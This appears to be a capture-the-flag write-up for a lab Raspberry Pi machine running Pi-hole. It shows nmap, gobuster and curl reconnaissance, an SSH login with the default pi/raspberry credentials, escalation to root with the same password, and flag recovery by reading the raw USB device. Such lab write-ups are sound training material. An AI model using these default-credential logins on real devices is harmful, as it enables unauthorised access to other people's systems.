
![image](https://user-images.githubusercontent.com/105310322/187500795-e2801f1b-8201-400d-9017-01895b8492b9.png)

### Tools: nmap, gobuster, ssh

### Vulnerabilities: Pi-Hole, Default credentials

Nmap shows us there is a webpage open.

The page is blank but a connection is established.

```console
└──╼ [★]$ nmap -sC -A -sV 10.129.50.166
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 16:29 BST
Nmap scan report for 10.129.50.166
Host is up (0.053s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
```

Running gobuster shows an admin and versions page we can check out.

```console
└──╼ [★]$ gobuster dir -u 10.129.50.166 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.50.166
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/30 16:33:18 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> http://10.129.50.166/admin/]
/versions             (Status: 200) [Size: 18]                                 
                                                                               
===============================================================
2022/08/30 16:33:31 Finished
===============================================================
```
Curl also reveals what the blank page is.

```console
└──╼ [★]$ curl -I 10.129.50.166
HTTP/1.1 404 Not Found
X-Pi-hole: A black hole for Internet advertisements.
Content-type: text/html; charset=UTF-8
Date: Tue, 30 Aug 2022 15:33:42 GMT
Server: lighttpd/1.4.35
```
Here we have the pi-hole admin page. This is our first hint that the page is being ran on a raspberry pi. Lets test some default credentials using the ssh port that nmap found.

![image](https://user-images.githubusercontent.com/105310322/187496695-09c93f38-309e-4c34-b6bf-847691968ea7.png)

A quick google search shows that the default credentials for a raspberry pi are User=pi and Pass=raspberry

Boom we are in pretty quickly!

```console
└──╼ [★]$ ssh pi@10.129.50.166
The authenticity of host '10.129.50.166 (10.129.50.166)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.50.166' (ECDSA) to the list of known hosts.
pi@10.129.50.166's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ whoami
pi
pi@raspberrypi:~ $ 
```
Full sudo power!? but before I tried that, I did su root with the same default password.

EASY DAY! Already got root and the user flag!

```console
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

pi@raspberrypi:~ $ su root
Password: 
root@raspberrypi:/home/pi# 
```
```console
root@raspberrypi:/home/pi/Desktop# cat user.txt
ff83****************************
```

It was too good to be true :(
At least we got our next hint :)

The root.txt is hiding in a usb stick so lets see if we can find it.

```console
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
root@raspberrypi:~# 
```
lsblk shows us where we can find the usbstick however there is not root.txt found in /media

The drive is located at /dev/sdb

```console
root@raspberrypi:/# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom  
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
root@raspberrypi:/# 
```
After using cat on sdb if pops alot of incomprehensible code but at the bottom we can see a string of characters resembling our root flag!

```console
root@raspberrypi:/dev# cat sdb
�|}*,.������+-���3d3e****************************
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
root@raspberrypi:/dev# 
```

If using cat to read the sdb file did not work then my next option would have been to extract or mount the usb to try and read the files but luckily the important information was all there.

GG!
